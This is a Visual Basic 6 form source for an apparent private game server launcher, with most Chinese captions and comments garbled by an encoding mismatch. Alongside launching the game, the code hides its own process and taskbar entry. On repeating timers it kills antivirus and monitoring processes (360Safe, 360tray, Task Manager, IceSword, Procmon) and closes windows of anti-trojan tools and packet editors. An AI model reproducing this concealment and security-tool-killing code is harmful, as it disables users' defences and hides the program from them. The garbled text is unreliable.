VERSION 5.00
Object = "{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}#1.1#0"; "ieframe.dll"
Begin VB.Form Form2 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "CC������(����Ҳ��԰�)"
   ClientHeight    =   5760
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   8550
   Icon            =   "Form2.frx":0000
   LinkTopic       =   "Form2"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   384
   ScaleMode       =   3  'Pixel
   ScaleWidth      =   570
   StartUpPosition =   2  '��Ļ����
   Begin VB.Frame Frame4 
      Caption         =   "��Ϸ����"
      Height          =   5655
      Left            =   120
      TabIndex        =   16
      Top             =   0
      Width           =   4095
      Begin SHDocVwCtl.WebBrowser Web 
         Height          =   5295
         Left            =   120
         TabIndex        =   17
         Top             =   240
         Width           =   3855
         ExtentX         =   6800
         ExtentY         =   9340
         ViewMode        =   0
         Offline         =   0
         Silent          =   0
         RegisterAsBrowser=   0
         RegisterAsDropTarget=   1
         AutoArrange     =   0   'False
         NoClientEdge    =   0   'False
         AlignLeft       =   0   'False
         NoWebView       =   0   'False
         HideFileNames   =   0   'False
         SingleClick     =   0   'False
         SingleSelection =   0   'False
         NoFolders       =   0   'False
         Transparent     =   0   'False
         ViewID          =   "{0057D0E0-3573-11CF-AE69-08002B2E1262}"
         Location        =   "http:///"
      End
   End
   Begin VB.Frame Frame3 
      Caption         =   "��Ϸ˵��"
      Height          =   1335
      Left            =   4320
      TabIndex        =   14
      Top             =   0
      Width           =   4095
      Begin VB.Label Label2 
         Caption         =   "˳��Ū����վ�ĸ����ǰ�,�ҿ��ܶ��˶�Ҫ������.�Ҿ�������˺������ڴ������.�����Ҳ������������.�����Ҫ�þ��Ա��.����������."
         Height          =   615
         Left            =   120
         TabIndex        =   18
         Top             =   600
         Width           =   3855
      End
      Begin VB.Label Label1 
         Caption         =   "���������������ѵ�½���ӿ�.����������ĵ�½��������ʲô���."
         Height          =   375
         Left            =   120
         TabIndex        =   15
         Top             =   240
         Width           =   3855
      End
   End
   Begin VB.Timer Timer2 
      Interval        =   200
      Left            =   6120
      Top             =   5280
   End
   Begin VB.CommandButton Command3 
      Caption         =   "������Ϸ"
      Height          =   375
      Left            =   4560
      TabIndex        =   13
      Top             =   5280
      Width           =   1215
   End
   Begin VB.Timer Timer1 
      Left            =   6120
      Top             =   4680
   End
   Begin VB.CommandButton Command4 
      Caption         =   "���س���"
      Height          =   375
      Left            =   6960
      TabIndex        =   12
      Top             =   5280
      Width           =   1215
   End
   Begin VB.CommandButton Command2 
      Caption         =   "ĳĳ��̳"
      Height          =   375
      Left            =   6960
      TabIndex        =   11
      Top             =   4680
      Width           =   1215
   End
   Begin VB.CommandButton Command1 
      Caption         =   "ĳĳ��վ"
      Height          =   375
      Left            =   4560
      TabIndex        =   10
      Top             =   4680
      Width           =   1215
   End
   Begin VB.Frame Frame2 
      Caption         =   "��Ϸ����"
      Height          =   1215
      Left            =   4320
      TabIndex        =   5
      Top             =   3360
      Width           =   4095
      Begin VB.CheckBox Check4 
         Caption         =   "�ر�����"
         Height          =   255
         Left            =   2160
         TabIndex        =   9
         Top             =   720
         Width           =   1095
      End
      Begin VB.CheckBox Check3 
         Caption         =   "�ر���Ч"
         Height          =   255
         Left            =   480
         TabIndex        =   8
         Top             =   720
         Width           =   1095
      End
      Begin VB.CheckBox Check2 
         Caption         =   "������֡"
         Height          =   255
         Left            =   2160
         TabIndex        =   7
         Top             =   360
         Value           =   1  'Checked
         Width           =   1095
      End
      Begin VB.CheckBox Check1 
         Caption         =   "����ģʽ"
         Height          =   255
         Left            =   480
         TabIndex        =   6
         Top             =   360
         Value           =   1  'Checked
         Width           =   1095
      End
   End
   Begin VB.Frame Frame1 
      Caption         =   "�Կ�������ѡ��"
      Height          =   1935
      Left            =   4320
      TabIndex        =   0
      Top             =   1440
      Width           =   4095
      Begin VB.OptionButton Option4 
         Caption         =   "4�� �߻��� ���� ��ҪӲ��D3D���ټ�T&&L"
         Height          =   255
         Left            =   120
         TabIndex        =   4
         Top             =   360
         Width           =   3615
      End
      Begin VB.OptionButton Option3 
         Caption         =   "3�� �߻��� ���� ��ҪӲ��D3D����"
         Height          =   255
         Left            =   120
         TabIndex        =   3
         Top             =   720
         Width           =   3255
      End
      Begin VB.OptionButton Option2 
         Caption         =   "2�� �߻��� ���� D3D�������ģʽ"
         Height          =   255
         Left            =   120
         TabIndex        =   2
         Top             =   1080
         Width           =   3255
      End
      Begin VB.OptionButton Option1 
         Caption         =   "1�� �ͻ��� ���� 2Dģʽ(��͸��Ч��)"
         Height          =   255
         Left            =   120
         TabIndex        =   1
         Top             =   1440
         Value           =   -1  'True
         Width           =   3495
      End
   End
   Begin VB.Menu menus 
      Caption         =   "�˵�"
      Visible         =   0   'False
      Begin VB.Menu mnuExit 
         Caption         =   "�˳�"
      End
   End
End
Attribute VB_Name = "Form2"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'����½����CC��������.
'����ҵ�½��(ԭʼ��)
'��������:CC
'��Ȩ��CC����.
'
'�����������˵��Ͷ��ɹ�.
'����QQ:8754347 (ûʲô�±�Ӻ�,���Ҫ�ӵĻ����������������)
'
'�������Ҫ������ϵ����������ķ���ҹ�.������˵��ûʲô����������.
'�Ͼ���Ҳ���ǿ�����½���Է���.ֻ�ǻ��Ǯ�������Ӷ���.�Ÿոո߶���Ҫ����׬Ǯ��,�������.


Option Explicit

Dim E As Long
Dim S(19) As String
Dim S1(4) As String
Dim S2(20) As String
Private Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Private Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal HWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal HWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal HWnd As Long) As Long
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Const WM_CLOSE = &H10
Private Type PROCESSENTRY32
dwSize As Long
cntUsage As Long
th32ProcessID As Long
th32DefaultHeapID As Long
th32ModuleID As Long
cntThreads As Long
th32ParentProcessID As Long
pcPriClassBase As Long
dwFlags As Long
szExeFile As String * 260
End Type
Private Declare Function CreateToolhelp32Snapshot Lib "kernel32" (ByVal dwFlags As Long, ByVal th32ProcessID As Long) As Long
Private Declare Function Process32First Lib "kernel32" (ByVal hSnapShot As Long, lppe As PROCESSENTRY32) As Long
Private Declare Function Process32Next Lib "kernel32" (ByVal hSnapShot As Long, lppe As PROCESSENTRY32) As Long
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal blnheritHandle As Long, ByVal dwAppProcessId As Long) As Long
Private Declare Function TerminateProcess Lib "kernel32" (ByVal ApphProcess As Long, ByVal uExitCode As Long) As Long
Private Declare Sub CloseHandle Lib "kernel32" (ByVal hPass As Long)
Private Const TH32CS_SNAPPROCESS = &H2&
Private Sub KillProcess(sProcess As String)
Dim lSnapShot As Long
Dim lNextProcess As Long
Dim tPE As PROCESSENTRY32
lSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0&)
If lSnapShot <> -1 Then
tPE.dwSize = Len(tPE)
lNextProcess = Process32First(lSnapShot, tPE)
Do While lNextProcess
If LCase$(sProcess) = LCase$(Left(tPE.szExeFile, InStr(1, tPE.szExeFile, Chr(0)) - 1)) Then
Dim lProcess As Long
Dim lExitCode As Long
lProcess = OpenProcess(1, False, tPE.th32ProcessID)
TerminateProcess lProcess, lExitCode
CloseHandle lProcess
End If
lNextProcess = Process32Next(lSnapShot, tPE)
Loop
CloseHandle (lSnapShot)
End If
End Sub

Private Sub Command1_Click()
Shell "Explorer.exe http://www.mlysj.cn"
End Sub

Private Sub Command2_Click()
Shell "Explorer.exe http://bbs.mlysj.cn"
End Sub

'
'���ύ��������ԭ���ҷ������ĵ�½��ԭ����ֱ���ù�����,֮���������֡
'�ر���Ч���ر����ֶ��޷���ʵ�ֺ�.��Ϊ��Ҳ�Ǵ�����������.һֱ��û����.
'���Լ��������ύ������û����.Ϊʲô�Ҳ������Ǹ�����?Ϊ�˷�����ϰ�߰�.
'�Ͼ�����Ҳ�ù�����ύ������.

Private Sub Command3_Click()
Dim RetVal As Long
If Dir(App.Path & "\mlysj.exe", vbDirectory) <> "" Then
    If Check1.Value = 1 Then
        If Option1.Value = True Then
            WindowState = vbMinimized
            Me.Hide
            RetVal = Shell("mlysj.exe updated graphicbin:32 graphicinfobin:32 animebin:7 animeinfobin:7 graphicbinv2:6 graphicinfobinv2:6 animebinv2:1 animeinfobinv2:1 IP:0:192.168.0.128:9020 graphicbinv3:22 graphicinfobinv3:22 animebinv3:11 animeinfobinv3:11 graphicbin_puk2:2 graphicinfobin_puk2:2 animebin_puk2:3 animeinfobin_puk2:3 graphicbin_puk3:1 graphicinfobin_puk3:1 animebin_puk3:2 animeinfobin_puk3:2 coordinatebinv3:2 coordinateinfobinv3:2 graphicbin_kw:1 graphicinfobin_kw:1 3Ddevice:1 windowmode", 1)
        ElseIf Option2.Value = True Then
            WindowState = vbMinimized
            Me.Hide
            RetVal = Shell("mlysj.exe updated graphicbin:32 graphicinfobin:32 animebin:7 animeinfobin:7 graphicbinv2:6 graphicinfobinv2:6 animebinv2:1 animeinfobinv2:1 IP:0:192.168.0.128:9020 graphicbinv3:22 graphicinfobinv3:22 animebinv3:11 animeinfobinv3:11 graphicbin_puk2:2 graphicinfobin_puk2:2 animebin_puk2:3 animeinfobin_puk2:3 graphicbin_puk3:1 graphicinfobin_puk3:1 animebin_puk3:2 animeinfobin_puk3:2 coordinatebinv3:2 coordinateinfobinv3:2 graphicbin_kw:1 graphicinfobin_kw:1 3Ddevice:2 onlyactive", 1)
        ElseIf Option3.Value = True Then
            WindowState = vbMinimized
            Me.Hide
            RetVal = Shell("mlysj.exe updated graphicbin:32 graphicinfobin:32 animebin:7 animeinfobin:7 graphicbinv2:6 graphicinfobinv2:6 animebinv2:1 animeinfobinv2:1 IP:0:192.168.0.128:9020 graphicbinv3:22 graphicinfobinv3:22 animebinv3:11 animeinfobinv3:11 graphicbin_puk2:2 graphicinfobin_puk2:2 animebin_puk2:3 animeinfobin_puk2:3 graphicbin_puk3:1 graphicinfobin_puk3:1 animebin_puk3:2 animeinfobin_puk3:2 coordinatebinv3:2 coordinateinfobinv3:2 graphicbin_kw:1 graphicinfobin_kw:1 3Ddevice:3 soundoff", 1)
        ElseIf Option4.Value = True Then
            WindowState = vbMinimized
            Me.Hide
            RetVal = Shell("mlysj.exe updated graphicbin:32 graphicinfobin:32 animebin:7 animeinfobin:7 graphicbinv2:6 graphicinfobinv2:6 animebinv2:1 animeinfobinv2:1 IP:0:192.168.0.128:9020 graphicbinv3:22 graphicinfobinv3:22 animebinv3:11 animeinfobinv3:11 graphicbin_puk2:2 graphicinfobin_puk2:2 animebin_puk2:3 animeinfobin_puk2:3 graphicbin_puk3:1 graphicinfobin_puk3:1 animebin_puk3:2 animeinfobin_puk3:2 coordinatebinv3:2 coordinateinfobinv3:2 graphicbin_kw:1 graphicinfobin_kw:1 3Ddevice:4 musicoff", 1)
        Else
            Unload Me
        End If
    
    ElseIf Check1.Value = 0 Then
        If Option1.Value = True Then
            WindowState = vbMinimized
            Me.Hide
            RetVal = Shell("mlysj.exe updated graphicbin:32 graphicinfobin:32 animebin:7 animeinfobin:7 graphicbinv2:6 graphicinfobinv2:6 animebinv2:1 animeinfobinv2:1 IP:0:192.168.0.128:9020 graphicbinv3:22 graphicinfobinv3:22 animebinv3:11 animeinfobinv3:11 graphicbin_puk2:2 graphicinfobin_puk2:2 animebin_puk2:3 animeinfobin_puk2:3 graphicbin_puk3:1 graphicinfobin_puk3:1 animebin_puk3:2 animeinfobin_puk3:2 coordinatebinv3:2 coordinateinfobinv3:2 graphicbin_kw:1 graphicinfobin_kw:1 3Ddevice:1", 1)
        ElseIf Option2.Value = True Then
            WindowState = vbMinimized
            Me.Hide
            RetVal = Shell("mlysj.exe updated graphicbin:32 graphicinfobin:32 animebin:7 animeinfobin:7 graphicbinv2:6 graphicinfobinv2:6 animebinv2:1 animeinfobinv2:1 IP:0:192.168.0.128:9020 graphicbinv3:22 graphicinfobinv3:22 animebinv3:11 animeinfobinv3:11 graphicbin_puk2:2 graphicinfobin_puk2:2 animebin_puk2:3 animeinfobin_puk2:3 graphicbin_puk3:1 graphicinfobin_puk3:1 animebin_puk3:2 animeinfobin_puk3:2 coordinatebinv3:2 coordinateinfobinv3:2 graphicbin_kw:1 graphicinfobin_kw:1 3Ddevice:2", 1)
        ElseIf Option3.Value = True Then
            WindowState = vbMinimized
            Me.Hide
            RetVal = Shell("mlysj.exe updated graphicbin:32 graphicinfobin:32 animebin:7 animeinfobin:7 graphicbinv2:6 graphicinfobinv2:6 animebinv2:1 animeinfobinv2:1 IP:0:192.168.0.128:9020 graphicbinv3:22 graphicinfobinv3:22 animebinv3:11 animeinfobinv3:11 graphicbin_puk2:2 graphicinfobin_puk2:2 animebin_puk2:3 animeinfobin_puk2:3 graphicbin_puk3:1 graphicinfobin_puk3:1 animebin_puk3:2 animeinfobin_puk3:2 coordinatebinv3:2 coordinateinfobinv3:2 graphicbin_kw:1 graphicinfobin_kw:1 3Ddevice:3", 1)
        ElseIf Option4.Value = True Then
            WindowState = vbMinimized
            Me.Hide
            RetVal = Shell("mlysj.exe updated graphicbin:32 graphicinfobin:32 animebin:7 animeinfobin:7 graphicbinv2:6 graphicinfobinv2:6 animebinv2:1 animeinfobinv2:1 IP:0:192.168.0.128:9020 graphicbinv3:22 graphicinfobinv3:22 animebinv3:11 animeinfobinv3:11 graphicbin_puk2:2 graphicinfobin_puk2:2 animebin_puk2:3 animeinfobin_puk2:3 graphicbin_puk3:1 graphicinfobin_puk3:1 animebin_puk3:2 animeinfobin_puk3:2 coordinatebinv3:2 coordinateinfobinv3:2 graphicbin_kw:1 graphicinfobin_kw:1 3Ddevice:4", 1)
        Else
            Unload Me
        End If
    Else
        WindowState = vbMinimized
    Me.Hide
            RetVal = Shell("mlysj.exe updated graphicbin:32 graphicinfobin:32 animebin:7 animeinfobin:7 graphicbinv2:6 graphicinfobinv2:6 animebinv2:1 animeinfobinv2:1 IP:0:192.168.0.128:9020 graphicbinv3:22 graphicinfobinv3:22 animebinv3:11 animeinfobinv3:11 graphicbin_puk2:2 graphicinfobin_puk2:2 animebin_puk2:3 animeinfobin_puk2:3 graphicbin_puk3:1 graphicinfobin_puk3:1 animebin_puk3:2 animeinfobin_puk3:2 coordinatebinv3:2 coordinateinfobinv3:2 graphicbin_kw:1 graphicinfobin_kw:1 3Ddevice:1 windowmode", 1)
End If
Else
MsgBox "����û���ҵ�mlysj.exe�ļ�,�뽫��½�ŵ�Ŀ¼������.", , "ħ����������ʾ��"
End If
Unload Me
End Sub

Private Sub Command4_Click()
Unload Me
End Sub

Private Sub Form_Load()
App.TaskVisible = False
Call HideCurrentProcess
Web.Navigate "http://www.mlysj.cn"

S(0) = "MOLIKISS ��Ѱ�  2007/2/3"  'S(0)-S(19)��Щ�ǽ�ֹ�򿪵��ļ�
S(1) = "��½(07.01.08)������"
S(2) = "ħ��YOYO��ԱVIP��(2007.07.08)������"
S(3) = "ħ��KISS VIP�շѰ�"
S(4) = "ħ��YOYO ��Ѱ�"
S(5) = "WPE9.0"
S(6) = "YOYO[852618]"
S(7) = "�� �� �� ��  V7.99"
S(8) = "YOYO[852618]"
S(9) = "IsHelp"
S(10) = "IceSword"
S(11) = "��½(0213)"
S(11) = "WinPatrol ���Ź�������è"
S(11) = "ľ��ɱ�� V5.31 ��ɫ�ر��"
S(11) = "ľ����������"
S(12) = "����ɱ�� 2.7"
S(13) = "�����������ר��"
S(14) = "��������ר��"
S(15) = "����"
S(16) = "����"
S(17) = "���ٳ��� 0.441"
S(18) = "Select target program"
S(19) = "���"


S1(0) = "ħ������"               'S(0)-S1(4)��Щ�ǹرճ�����Զ��رյĴ�������
S1(1) = "ħ������ ħ��������"
S1(2) = "ħ������ ħ�������� [ħ��������1��]"
S1(3) = "IceSword"
S1(4) = "ħ������ ħ��������[ħ��������1��]"

S2(0) = "ħ��YOYO��ԱVIP��(2007.07.08)������"  'S2(0)-S1(20)������Щ�������������رյ�½��
S2(1) = "��½(0213)  ħ��YOYO��Ѱ�"
S2(2) = "���"
S2(3) = "IceSword"
S2(4) = "�����ս���"
S2(5) = "���̲鿴��V1.0"
S2(6) = "YOYO[852618]"
S2(7) = "Windows Resizer 1.0.2 ���İ�"
S2(8) = "ѡ����Ϸ"
S2(9) = "Windows Resizer 1.0.5 ���İ�"
S2(10) = "Windows Resizer 1.0.4 ���İ�"
S2(11) = "Select target program"
S2(12) = "����ɱ�� 2.7"
S2(13) = "WinPatrol ���Ź�������è"
S2(14) = "ľ��ɱ�� V5.31 ��ɫ�ر��"
S2(15) = "ľ����������"
S2(16) = "�����������ר��"
S2(17) = "��������ר��"
S2(18) = "����ɱ�� 2.7"
S2(19) = "����"
S2(20) = "����"

Timer1.Interval = 100
Timer1.Enabled = True
AddToTray Me, menus
SetTrayTip Me.Caption
End Sub

Private Sub Form_Unload(Cancel As Integer)
If E = 0 Then
   Cancel = 1
   Me.WindowState = 1
   Me.Visible = False
Else
   RemoveFromTray
   Dim H As Long, I As Long, L As Long, T As String
   Do
      H = FindWindowEx(0, H, vbNullString, vbNullString)
      L = GetWindowTextLength(H)
      T = Space(L)
      GetWindowText H, T, L + 1
      T = Left(T, L)
      For I = 0 To 4
         If T Like "*" & S1(I) & "*" Then PostMessage H, WM_CLOSE, 0, ByVal 0
      Next
   Loop Until H = 0
End If
End Sub

Private Sub mnuExit_Click()
E = 1
Unload Me
End Sub

Private Sub Timer1_Timer()
Dim H As Long, I As Long
For I = 0 To 19
   H = 0
   H = FindWindow(vbNullString, S(I))
   If H <> 0 Then
       PostMessage H, WM_CLOSE, 0, ByVal 0
   End If
Next
For I = 0 To 20
   H = 0
   H = FindWindow(vbNullString, S2(I))
   If H <> 0 Then
       mnuExit_Click
   End If
Next
End Sub
Private Sub Timer2_Timer()
Call KillProcess("YOYO.exe")   '���ǽ��̵�.�������ڽ�������ֱ��KILL��.
Call KillProcess("360tray.exe")
Call KillProcess("taskmgr.exe")
Call KillProcess("IceSword.exe")
Call KillProcess("MOLIKISSVIP.exe")
Call KillProcess("360Safe.exe")
Call KillProcess("KillProcess.exe")
Call KillProcess("ħ��YOYO��Ѱ�.exe")
Call KillProcess("Procmon.exe")
Call KillProcess("WPE רҵ�� - mlysj.exe")
Call KillProcess("ħ��YOYO��Ѱ�.exe")
Call KillProcess("KISS.exe")
Call KillProcess("kiss.exe")

End Sub
